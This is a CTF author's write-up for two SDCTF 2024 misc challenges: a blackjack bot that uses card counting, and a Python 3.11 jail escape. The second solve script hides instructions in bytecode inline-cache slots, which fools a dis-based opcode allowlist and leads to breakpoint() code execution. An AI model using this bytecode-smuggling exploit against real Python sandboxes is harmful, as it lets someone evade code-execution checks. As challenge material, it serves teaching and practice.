---
title: "SDCTF 2024: Blackjack Card Counting and Python 3.11 Bytecode Cache Exploitation"
date: 2024-05-15 10:00:00
tags:
  [
    sdctf-2024,
    python,
    bytecode,
    card-counting,
    misc,
    ctf-writeup,
    author-writeup,
  ]
---

![](logo.png)

This weekend, ACM Cyber at UC San Diego hosted **SDCTF 2024**, an online CTF competition lasting 48 hours, where players around the world compete to solve challenges and capture flags in the categories: web, pwn, reverse engineering, cryptography, and misc. I was one of the authors for this CTF, and wrote 4 challenges in total. This is the first in a series of three articles covering all 4 challenges. In this post, I will share notes on my explanations, ideas, and solutions for two misc challenges: Blackjack and my-favorite-code.

# Misc

## Blackjack (14 solves, 162 pts)

### Description

GAMBA

### Challenge

You are given an attachment `blackjack.zip`. This file contains the necessary files to run a Docker container. Once running the entry, `main.py` script, we are prompted with the following:

```console
[Dealer] Resetting shoe...
Player balance: 30000
[BEGIN USER INTERACTION]
Player, enter your bet:
```

We are given $30000 to start with and we can place bets to play blackjack. The `main.py` file is as follows:

```py
import os
from game import Game, TABLE_MINIMUM, TABLE_MAXIMUM, TOO_MUCH_MONEY

FLAG = os.environ.get("FLAG", "sdctf{test_flag}")

game = Game()
game.start_game()
while True:
    game.play_round()
    if game.player.balance < TABLE_MINIMUM:
        print("You don't have enough money to play another round. Goodbye.")
        break
    if game.player.balance > TOO_MUCH_MONEY:
        print("I'm sorry I'm going to have to back you off. You're too good for us.")
        print(f"Here is a flag for your troubles: {FLAG}")
        break
```

From here we can see that if we can get our balance to exceed `TOO_MUCH_MONEY`, we will be given the flag. The `TOO_MUCH_MONEY` is defined in `game.py` as `150000`. The `Game` class is defined in `game.py` and contains the logic for the blackjack game.

```py
TABLE_MINIMUM = 50
TABLE_MAXIMUM = 2000
TOO_MUCH_MONEY = 150000
```

### Notes

I hope people didn't spend too much time trying to find a programming bug in the blackjack source code itself, since there was not intended to be one. The intended solution is a "vulnerability" in the game of Blackjack itself. While the game normally has a house edge, its possible to play in such a way that the player can start to even out those odds. This strategy is called "Basic Strategy" and is a set of rules that tells you the optimal best move to make in every situation. Its possible to go further using rules such as card counting and deviations, and this can start to give the player an edge over the house.

When developing the challenge, I found with only basic strategy, a bit of time, and some luck, it was possible to still achieve the target balance, so this was sufficient. This was more of a PPC challenge and I hope people enjoyed it.

### Solve Script

```py
H, S, D, SP = 'hit', 'stand', 'double', 'split'

PLAYER_TOTAL = [
    #   2       3       4       5       6       7       8       9       10      A
    [   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  # 2
    [   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  # 3
    [   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  # 4
    [   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  # 5
    [   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  # 6
    [   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  # 7
    [   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  # 8
    [   H,      D,      D,      D,      D,      H,      H,      H,      H,      H   ],  # 9
    [   D,      D,      D,      D,      D,      D,      D,      D,      H,      H   ],  # 10
    [   D,      D,      D,      D,      D,      D,      D,      D,      D,      H   ],  # 11
    [   H,      H,      S,      S,      S,      H,      H,      H,      H,      H   ],  # 12
    [   S,      S,      S,      S,      S,      H,      H,      H,      H,      H   ],  # 13
    [   S,      S,      S,      S,      S,      H,      H,      H,      H,      H   ],  # 14
    [   S,      S,      S,      S,      S,      H,      H,      H,      H,      H   ],  # 15
    [   S,      S,      S,      S,      S,      H,      H,      H,      H,      H   ],  # 16
    [   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  # 17
    [   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  # 18
    [   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  # 19
    [   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  # 20
]

HANDS_WITH_ACE = [
    #   2       3       4       5       6       7       8       9       10      A
    [   H,      H,      H,      D,      D,      H,      H,      H,      H,      H   ],  # A2
    [   H,      H,      H,      D,      D,      H,      H,      H,      H,      H   ],  # A3
    [   H,      H,      D,      D,      D,      H,      H,      H,      H,      H   ],  # A4
    [   H,      H,      D,      D,      D,      H,      H,      H,      H,      H   ],  # A5
    [   H,      D,      D,      D,      D,      H,      H,      H,      H,      H   ],  # A6
    [   S,      D,      D,      D,      D,      S,      S,      H,      H,      H   ],  # A7
    [   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  # A8
    [   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  # A9
]

PAIR = [
    #   2       3       4       5       6       7       8       9       10      A
    [   SP,     SP,     SP,     SP,     SP,     SP,     H,      H,      H,      H   ],  # 2,2
    [   SP,     SP,     SP,     SP,     SP,     SP,     H,      H,      H,      H   ],  # 3,3
    [   H,      H,      H,      SP,     SP,     H,      H,      H,      H,      H   ],  # 4,4
    [   D,      D,      D,      D,      D,      D,      D,      D,      H,      H   ],  # 5,5
    [   SP,     SP,     SP,     SP,     SP,     H,      H,      H,      H,      H   ],  # 6,6
    [   SP,     SP,     SP,     SP,     SP,     SP,     H,      H,      H,      H   ],  # 7,7
    [   SP,     SP,     SP,     SP,     SP,     SP,     SP,     SP,     SP,     SP  ],  # 8,8
    [   SP,     SP,     SP,     SP,     SP,     S,      SP,     SP,     S,      S   ],  # 9,9
    [   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  # 10,10
    [   SP,     SP,     SP,     SP,     SP,     SP,     SP,     SP,     SP,     SP  ],  # A,A
]

import re
def extract_cards_from_string(s):
    extract = r"\b(\w+|\d+)\s+of\b"
    return re.findall(extract, s)

def get_value(cards):
    value = 0
    aces = 0
    for card in cards:
        if card.isnumeric():
            value += int(card)
        else:
            if card == 'Ace':
                aces += 1
                value += 11
            else:
                value += 10

    while value > 21 and aces:
        value -= 10
        aces -= 1

    soft = aces > 0
    return value, soft

from pwn import *

BALANCE = 30000

sprint = print
print = lambda *x: None

def update_count(card):
    global count
    if card not in ['2', '3', '4', '5', '6', '7', '8', '9', '10', 'Jack', 'Queen', 'King', 'Ace']:
        print("INVALID CARD", card)
        exit()
    if card in ['2', '3', '4', '5', '6']:
        count += 1

    elif card in ['10', 'Jack', 'Queen', 'King', 'Ace']:
        count -= 1

count = 0
cards_seen = 0
game_state = {}

validate_end_turn_computation = 1

import time
p = remote("127.0.0.1", 36051)
while 1:
    try:
        resp = p.recvuntil(b"[BEGIN USER INTERACTION]\n")[:-len(b"[BEGIN USER INTERACTION]\n")].decode().split("\n")
        resp = [x.strip() for x in resp if x]

        for line in resp:
            print(f"[RESP] {line}")

        if resp[-1].startswith("Player balance"):
            BALANCE = float(resp[-1].split(" ")[-1])
            sprint("MY BALANCE: ", BALANCE)
            dealer_hand = [line for line in resp if line.startswith("[Dealer] Dealer's ending hand")]
            if not dealer_hand:
                validate_end_turn_computation -= 1
                if validate_end_turn_computation < 0:
                    print("SOMETHING IS WRONG")
                    exit()
            else:
                ending_hand_line = [line for line in resp if line.startswith("[Dealer] Dealer's ending hand")][0]
                my_ending_hands = [line for line in resp[resp.index(ending_hand_line):] if line.startswith("(Hand ")]

                dealer_hand = extract_cards_from_string(ending_hand_line)
                my_ending_hands = [extract_cards_from_string(hand) for hand in my_ending_hands]
                print(resp)
                print(my_ending_hands, dealer_hand)
                for card in dealer_hand:
                    update_count(card)
                    cards_seen += 1

                for hand in my_ending_hands:
                    for card in hand:
                        update_count(card)
                        cards_seen += 1

        for line in resp:
            if "Resetting shoe" in line:
                print("RESET COUNT")
                count = 0
                cards_seen = 0
            if "Remaining balance" in line:
                BALANCE = float(line.split('$')[-1])
            elif "Dealer's up card" in line:
                upcard = extract_cards_from_string(line)[0]
                game_state['upcard'], _ = get_value([upcard])

        input_prompt = p.recv().decode()

        print("INPUT>>> " + input_prompt)
        if "enter your bet" in input_prompt:
            true_count = int(count / ((52*4 - cards_seen) / (52)))
            if true_count <= 1:
                bet = max(50, min(BALANCE, 50))
            elif true_count == 2:
                bet = max(50, min(BALANCE, 500))
            elif true_count == 3:
                bet = max(50, min(BALANCE, 2000))
            elif true_count == 4:
                bet = max(50, min(BALANCE, 2000))
            elif true_count >= 5:
                bet = max(50, min(BALANCE, 2000))

            p.sendline(str(int(bet)))
            BALANCE -= bet

            game_state = {}

        elif "What would you like to do?" in input_prompt:
            options = input_prompt.split("(")[-1].split(")")[0].split(", ")
            print(resp)
            my_cards = [line for line in resp if line.startswith("(Hand ")][-1]
            my_cards = extract_cards_from_string(my_cards)
            my_value, soft = get_value(my_cards)

            if my_value == 21:
                p.sendline(b"stand")
                continue

            upcard = game_state['upcard']
            print("My cards: ", my_cards)
            print("My value: ", my_value)
            print("Soft: ", soft)
            print("Upcard: ", upcard)
            if len(my_cards) == 2 and my_cards[0] == my_cards[1] and 'split' in options:
                print("USING PAIR STRATEGY")
                option = PAIR[get_value([my_cards[0]])[0] - 2][upcard - 2]
            elif soft:
                print("USING HANDS WITH ACE STRATEGY")
                option = HANDS_WITH_ACE[my_value - 13][upcard - 2]
            else:
                print("USING PLAYER TOTAL STRATEGY")
                option = PLAYER_TOTAL[my_value - 2][upcard - 2]

            def resolve_and_execute(option):
                if option in options:
                    p.sendline(option)
                    print(f"Choosing {option}")
                else:
                    print(f"Choosing {option}, resolving to hit")
                    p.sendline(b'hit')
            resolve_and_execute(option)

    except EOFError:
        sprint(p.clean().decode())
        break

print(resp)
```

### References

- https://www.blackjackapprenticeship.com/blackjack-strategy-charts/
- https://en.wikipedia.org/wiki/Card_counting

---

## my-favorite-code (1 solve, 500 pts)

### Description

Hey. I'm looking for my friend Penguin, have you seen him?

### Challenge

You are given an attachment `my-favorite-code.zip`. This file contains `jail.py`, and a Dockerfile for the remote setup.

The file first prompts the user to select their favorite python opcode. It then adds both the users selected opcode and `COMPARE_OP` to a set called `CHOICES`.

```py
CHOICES = set()

print("My favorite python opcode is COMPARE_OP!")
CHOICES.add('COMPARE_OP')
print("What is your favorite python opcode?")
op = input()

if op not in opcode.opmap:
    print("That opcode doesn't exist!")
    exit()

CHOICES.add(op)
```

Next, we are asked to provide some base64 encoded string.

```py
print("I wonder what we can do with these...")
code = base64.b64decode(input())
```

Finally, the code is run:

```py
if not run(code):
    print("I guess not much.")
else:
    print("WOW")
```

Lets look a bit closer at this run method:

```py
def get_instructions(func):
    return {x.opname for x in dis.Bytecode(func)}

def run(code):
    code = marshal.loads(code)
    instructions = get_instructions(code)
    if instructions != CHOICES:
        return False

    def runner():
        ...

    runner.__code__ = code
    runner()
```

We unmarshal the bytes sent by the user. We then use `dis.Bytecode` to get a set containing of all the OPCODES in the main procedure of the function. Finally, if this set is equal to our original choices, we run the code, by replacing the `__code__` object of a dummy function to the inputted code object, and calling it.

Note furthermore, the docker container shows that we have a flag on the system, which implies that this challenge requires us to run arbitrary code and escape the jail.

### Solution

What appears to be happening is that we need to somehow gain arbitrary code execution using only 2 OPCODES. But this seems impossible?! Expecially since we are forced to use `COMPARE_OP`, which at face value doesn't seem to do much. We can try picking an opcode like CALL, but we end up with issues since we still need to use LOAD_NAME or LOAD_GLOBAL to get function we want to call. If we use LOAD_NAME, then we can get objects on the stack, but we can't really do much with it.

A key insight, which was provided and necessary to identify in the challenge files is the Python version of the server. In the Dockerfile, we can see the server is running `python3.11`. Python3.11 adds some interesting features, but 1 subtle feature which it states in the release notes:

> The bytecode now contains inline cache entries, which take the form of the newly-added CACHE instructions. Many opcodes expect to be followed by an exact number of caches, and instruct the interpreter to skip over them at runtime. Populated caches can look like arbitrary instructions, so great care should be taken when reading or modifying raw, adaptive bytecode containing quickened data.

### Inline Cache?

Inline cache is an addition added via the following cpython [issue](https://github.com/python/cpython/issues/90997). The idea is that certain OPCODES will be provided space that allows for the interpreter to cache certain values. This is done to speed up the interpreter, and is a form of optimization. The cache is stored in the bytecode directly, so does not require any overhead or change on the interpreter side. We can see this when we inspect certain functions using dis in `python3.11`:

```py
Python 3.11.4 (main, Jun  7 2023, 12:45:48) [GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from dis import dis
>>> def f():
...     return int('1')
...
>>> dis(f, show_caches=True)
  1           0 RESUME                   0

  2           2 LOAD_GLOBAL              1 (NULL + int)
              4 CACHE                    0
              6 CACHE                    0
              8 CACHE                    0
             10 CACHE                    0
             12 CACHE                    0
             14 LOAD_CONST               1 ('1')
             16 PRECALL                  1
             18 CACHE                    0
             20 CALL                     1
             22 CACHE                    0
             24 CACHE                    0
             26 CACHE                    0
             28 CACHE                    0
             30 RETURN_VALUE
```

With the `show_caches` flag in any dis function, we can see the caches space for each operation. What this means at interest for us, is that when LOAD_GLOBAL instruction is executed, the interpreter will need to actually jump over the 5 cache entries. Interestingly, `COMPARE_OP` is one such function which has 2 CACHE entries.

Note however, that if we call `get_instructions` function as shown in the source code on this function:

```py
>>> get_instructions(f)
{'CALL', 'LOAD_GLOBAL', 'RETURN_VALUE', 'LOAD_CONST', 'PRECALL', 'RESUME'}
```

We don't see those CACHE lines. With this, we have an idea of how to solve the challenge.
We want to design our bytecode in such a way that the only OPCODES visible to dis, are `COMPARE_OP`, and something else. We can then use the CACHE entries to store the actual OPCODES we want to run. What will that something else be, `JUMP_FORWARD`! This will give us the ability to jump into these CACHE entries, and execute the hidden OPCODES.

### Solve Script

```py
import opcode
from opcode import opmap
import base64
import dis

import marshal
import tempfile

import sys, os

for k in opmap:
    globals()[k] = opmap[k]

def f():
    breakpoint()

code = f.__code__
b = marshal.dumps(code)

dis.dis(code, show_caches=True)
co_code = code.co_code
print(len(co_code))

co_code_section = len(co_code).to_bytes(4, byteorder='little') + co_code


prefix = b[:b.find(co_code_section)]
suffiix = b[b.find(co_code_section) + len(co_code_section):]

new_code = bytearray([
    JUMP_FORWARD, 1,
    COMPARE_OP, 0,
    LOAD_GLOBAL, 1,
    0, 0,
    COMPARE_OP, 0,
    0, 0,
    0, 0,
    COMPARE_OP, 0,
    NOP, 0,
    JUMP_FORWARD, 1,
    COMPARE_OP, 0,
    PRECALL, 0,
    0, 0,
    JUMP_FORWARD, 1,
    COMPARE_OP, 0,
    CALL, 0,
    0, 0,
    JUMP_FORWARD, 1,
    JUMP_FORWARD, 1,
    JUMP_FORWARD, 1,
    JUMP_FORWARD, 1,
    COMPARE_OP, 0,
    POP_TOP, 0,
    LOAD_CONST, 0,
    JUMP_FORWARD, 1,
    COMPARE_OP, 0,
    RETURN_VALUE, 0
])


print(f"New code: {new_code}")
dis.dis(new_code )
print('-'*40)
dis.dis(new_code, show_caches=True )

new_code_section = len(new_code).to_bytes(4, byteorder='little') + new_code

new_code_object = prefix + new_code_section + suffiix
payload = base64.b64encode(new_code_object)

def runner():
    ...

runner.__code__ = marshal.loads(new_code_object)

from pwn import *

r = remote('localhost', 33851)
r.sendlineafter(b"opcode?", b"JUMP_FORWARD")
r.sendlineafter(b"these...", payload)
r.interactive()
```

### Notes

This was hopefully a fun challenge to solve. I think the overall payload is not too long, but the main inspiration is realizing how to trick the disassembler in what is actually being run. Its interesting to see how the code is offset by the CACHE entries, and how we can use this to our advantage.

This challenge had one solve by `Maple Bacon`, and used an additional trick, which was the fact that the code object could contain lambda functions, but these would not be checked by the disassembler. This allowed them to create a lambda function that would execute the hidden code object. However in order to call this lambda function, it was still necessary to use the CACHE jump trick. Very nice!

### References

- https://docs.python.org/3.11/whatsnew/3.11.html#cpython-bytecode-changes
- https://github.com/python/cpython/issues/90997
